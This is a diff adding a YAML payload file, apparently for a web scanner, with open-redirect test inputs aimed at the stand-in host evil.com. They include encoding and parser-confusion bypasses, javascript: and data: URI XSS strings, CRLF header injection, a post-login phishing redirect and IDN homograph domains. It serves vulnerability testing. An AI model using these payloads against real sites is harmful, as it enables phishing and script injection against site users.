@@ -1,0 +1,282 @@
+defaults:
+  vuln_type: redirect
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Parameter-based open redirect — direct
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com"
+    notes: "Direct external URL in redirect parameter (url=, next=, redirect=, return=)."
+    tags: [param, direct, basic]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "//evil.com"
+    notes: "Protocol-relative URL. Browser resolves to https://evil.com."
+    tags: [param, protocol_relative]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "/\\evil.com"
+    notes: "Backslash after slash. Some parsers treat as //evil.com."
+    tags: [param, backslash, bypass]
+
+  # ============================================================
+  # Authority / host confusion
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com%2f@legitimate.com"
+    notes: "URL authority confusion. May redirect to evil.com with legitimate.com as userinfo."
+    tags: [param, authority_confusion, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://legitimate.com@evil.com"
+    notes: "Userinfo confusion — legitimate.com becomes username, evil.com is the host."
+    tags: [param, userinfo, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com#legitimate.com"
+    notes: "Fragment confusion. Redirects to evil.com with fragment."
+    tags: [param, fragment, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com?legitimate.com"
+    notes: "Query confusion. Redirects to evil.com with query."
+    tags: [param, query, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://legitimate.com.evil.com"
+    notes: "Subdomain confusion. Requires attacker-controlled domain."
+    tags: [param, subdomain, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com/legitimate.com"
+    notes: "Path confusion. Evil domain with legitimate in path."
+    tags: [param, path_confusion, bypass]
+
+  # ============================================================
+  # JavaScript / data URI
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "javascript:alert(document.domain)"
+    notes: "JavaScript URI in redirect parameter. XSS via redirect."
+    tags: [param, javascript_uri, xss]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "data:text/html,<script>alert(1)</script>"
+    notes: "Data URI in redirect. XSS via redirect."
+    tags: [param, data_uri, xss]
+
+  # ============================================================
+  # URL-encoded variants
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: url
+    evidence_type: redirect
+    risk: 2
+    payload: "https%3A%2F%2Fevil.com"
+    notes: "URL-encoded external URL."
+    tags: [param, url_encoded]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: double_url
+    evidence_type: redirect
+    risk: 2
+    payload: "https%253A%252F%252Fevil.com"
+    notes: "Double URL-encoded. Bypasses single-decode validation."
+    tags: [param, double_encoded, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: url
+    evidence_type: redirect
+    risk: 2
+    payload: "%2F%2Fevil.com"
+    notes: "URL-encoded protocol-relative redirect."
+    tags: [param, url_encoded, protocol_relative]
+
+  # ============================================================
+  # Path-based open redirect
+  # ============================================================
+  - technique: open_redirect_path
+    injection_surface: path
+    evidence_type: redirect
+    risk: 2
+    payload: "//evil.com"
+    notes: "Protocol-relative redirect via path. e.g., /redirect//evil.com"
+    tags: [path, protocol_relative]
+
+  - technique: open_redirect_path
+    injection_surface: path
+    evidence_type: redirect
+    risk: 2
+    payload: "..%2f..%2f..%2f..%2fevil.com"
+    notes: "Traversal in path to reach external domain."
+    tags: [path, traversal, url_encoded]
+
+  - technique: open_redirect_path
+    injection_surface: path
+    evidence_type: redirect
+    risk: 2
+    payload: "/\\evil.com"
+    notes: "Backslash in path for redirect confusion."
+    tags: [path, backslash, bypass]
+
+  # ============================================================
+  # Header-based redirect
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: header
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com"
+    notes: "Redirect via header (Host, X-Forwarded-Host). Check if response Location header reflects."
+    tags: [header, host, location]
+
+  - technique: open_redirect_param
+    injection_surface: header
+    evidence_type: redirect
+    risk: 2
+    payload: "evil.com"
+    notes: "Host header override. If app uses Host header for redirect URL generation."
+    tags: [header, host_override]
+
+  # ============================================================
+  # JSON body
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: json_body
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com"
+    notes: "Redirect URL in JSON body (e.g., callback_url, return_url field)."
+    tags: [json, callback]
+
+  # ============================================================
+  # Post-login redirect
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil.com/phishing"
+    notes: "Post-login redirect parameter. After auth, user redirected to phishing page."
+    tags: [param, post_login, phishing]
+
+  # ============================================================
+  # CRLF + redirect
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: header_match
+    risk: 3
+    payload: "%0d%0aLocation:%20https://evil.com"
+    notes: "CRLF injection to set Location header. Header injection leads to open redirect."
+    tags: [crlf, header_injection, bypass]
+
+  # ============================================================
+  # Whitespace / special-char bypass
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: " https://evil.com"
+    notes: "Leading space. Some URL validators strip spaces before checking."
+    tags: [param, whitespace, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "\thttps://evil.com"
+    notes: "Leading tab character."
+    tags: [param, whitespace, tab, bypass]
+
+  # ============================================================
+  # Null byte
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: redirect
+    risk: 2
+    payload: "https://legitimate.com%00.evil.com"
+    notes: "Null byte domain truncation attempt."
+    tags: [param, null_byte, bypass]
+
+  # ============================================================
+  # Triple-slash / scheme variants
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "///evil.com"
+    notes: "Triple-slash. Some browsers and frameworks resolve ///evil.com as protocol-relative to evil.com. Bypasses filters checking for exactly //."
+    tags: [param, triple_slash, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "////evil.com"
+    notes: "Quad-slash. Additional slashes may be collapsed by URL normalization, resulting in //evil.com redirect."
+    tags: [param, multi_slash, bypass]
+
+  # ============================================================
+  # Unicode / IDN homograph
+  # ============================================================
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: unicode
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evil\u3002com"
+    notes: "Unicode ideographic full stop (U+3002) instead of dot. Some URL parsers normalize this to evil.com. Bypasses domain allowlist string matching."
+    tags: [param, unicode, idn, bypass]
+
+  - technique: open_redirect_param
+    injection_surface: query
+    encoding: unicode
+    evidence_type: redirect
+    risk: 2
+    payload: "https://evіl.com"
+    notes: "Cyrillic 'і' (U+0456) instead of Latin 'i'. IDN homograph attack — visually identical domain that resolves differently. Tests if allowlist checks compare decoded Unicode."
+    tags: [param, homograph, idn, bypass]
